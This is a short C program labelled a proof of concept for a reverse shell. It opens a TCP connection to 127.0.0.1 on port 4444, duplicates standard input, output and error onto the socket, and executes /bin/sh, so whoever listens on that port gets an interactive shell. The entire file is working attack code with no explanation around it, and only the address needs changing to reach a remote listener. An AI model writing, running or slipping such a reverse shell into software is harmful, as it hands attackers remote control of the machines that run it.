// POC of a reverse shell
#include <arpa/inet.h>
#include <sys/socket.h>
#include <unistd.h>

#define PORT 4444

int main()
{
	int sockfd;

	struct sockaddr_in addr;
	socklen_t addrlen = sizeof(struct sockaddr_in);

	addr.sin_family = AF_INET;
	addr.sin_port = htons(PORT);
	inet_pton(AF_INET, "127.0.0.1", &addr.sin_addr.s_addr);

	sockfd = socket(AF_INET, SOCK_STREAM, 0);

	connect(sockfd, (struct sockaddr *)&addr, addrlen);

	dup2(sockfd, STDIN_FILENO);
	dup2(sockfd, STDOUT_FILENO);
	dup2(sockfd, STDERR_FILENO);

	execve("/bin/sh", NULL, NULL);
}
